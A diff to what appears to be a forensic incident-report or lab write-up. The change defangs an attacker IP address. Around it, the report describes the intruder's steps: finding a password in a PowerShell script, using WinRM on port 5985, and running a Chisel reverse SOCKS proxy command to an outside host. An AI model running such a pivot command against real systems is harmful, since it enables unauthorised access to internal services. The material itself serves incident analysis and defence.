@@ -67,7 +67,7 @@ The technical artefacts of the attack are covered by this report along with a cl
 * **Investigation Continues**
   * After going through more encoded commands that were executed by the attacker, it was discovered that the attacker had found sensitive information such as the `[REDACTED]` user password,  via a powershell scripted titled `automation.ps1`.
   * The attacker had enumerated the listening ports inside the machine, and utilized the port `5985` (WinRM) to establish a remote shell connection.
-  * After enumerating the listening ports, the attacker established a reverse socks proxy for access to the internal services inside the machine using the following command: `C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks`
+  * After enumerating the listening ports, the attacker established a reverse socks proxy for access to the internal services inside the machine using the following command: `C:\Users\benimaru\Downloads\ch.exe client 167[.]71[.]199[.]191:8080 R:socks`
     * Hash of binary `ch.exe`: `8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451`
   * After utilizing some OSINT (VirusTotal) on the hash above, it was discovered that the attacker made use of the tool `Chisel`.
   * The attacker then used the previously mentioned `WinRM` tied to the port `5985` to authenticate and interact with the system.
